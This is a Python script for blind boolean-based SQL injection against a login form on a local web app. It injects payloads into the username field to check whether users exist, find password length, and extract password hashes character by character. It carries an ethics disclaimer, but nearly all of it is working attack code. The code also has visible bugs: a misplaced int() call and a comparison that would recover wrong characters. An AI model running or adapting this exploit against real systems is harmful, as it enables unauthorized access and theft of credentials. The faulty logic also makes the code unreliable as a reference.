# ##################################################################################################################
#
# SQL Injection Exploitation Script
#
# ##################################################################################################################
#
# Usage Guidelines:
#
# Responsible Use: Please use this script in a responsible and ethical manner. Unauthorized access to computer systems, networks, or devices is illegal and unethical.
# Authorized Access: Before using this script on any system that you do not own or administer, ensure you have obtained written authorization from the system owner or authorized personnel. Unauthorized access is a violation of privacy and may result in legal consequences.
# Educational Purposes: This script is intended for educational purposes to understand security vulnerabilities and should not be used maliciously.
# Legal Compliance: Comply with all applicable laws and regulations regarding computer security and data privacy in your jurisdiction.
# By using this script, you acknowledge and agree to abide by these guidelines and accept full responsibility for any consequences resulting from its use. 
#
# ##################################################################################################################

import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

# In this code, the injected_query function sends an HTTP POST request to a target URL with a SQL injection payload constructed using the provided payload.
# It increments the total_queries counter and returns True if a specific string (needle) is not found in the response content, indicating a successful SQL injection.

def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
	total_queries += 1
	return needle.encode() not in r.content

# In this code, the boolean_query function constructs an SQL injection payload to extract a single character of the password hash for a specified user_id.
# The payload is generated based on the offset (character position), user_id, character, and an optional operator, and it calls the injected_query function
# to check if the payload successfully extracts the character using a boolean-based SQL injection technique.

def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
	return injected_query(payload)

# The invalid_user function constructs an SQL injection payload to check if a user with the specified user_id exists in the database by querying the
# user table. It then calls the injected_query function to determine if the user exists based on the SQL injection result.

def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

# The password_length function iteratively determines the length of the password associated with a given user_id by incrementing the i variable,
# which represents the potential password length. It constructs SQL injection payloads with different lengths and checks their success using the
# injected_query function until a valid length is found, at which point it returns that length.

def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i
		i += 1

# The extract_hash function uses a loop to iteratively extract each character of the password hash for a given user_id based on the provided charset.
# It calls the boolean_query function to check and append characters to the found string until the entire password hash is reconstructed and returned.

def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

# The total_queries_taken function prints the total number of queries made during the execution of the script, which is stored in the total_queries
# variable. After printing, it resets the total_queries counter to zero using the global keyword.

def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0

# This code creates an interactive loop that repeatedly prompts the user to enter a user ID. It then checks if the user exists in the database using
# the invalid_user function, and if the user exists, it calculates the length of their password hash and extracts the hash using the password_length
# and extract_hash functions. The total number of queries made during this process is displayed, and the loop continues until the user interrupts it
# with a keyboard shortcut (Ctrl+C).

while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id, user_password_length))))
			total_queries_taken()
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break
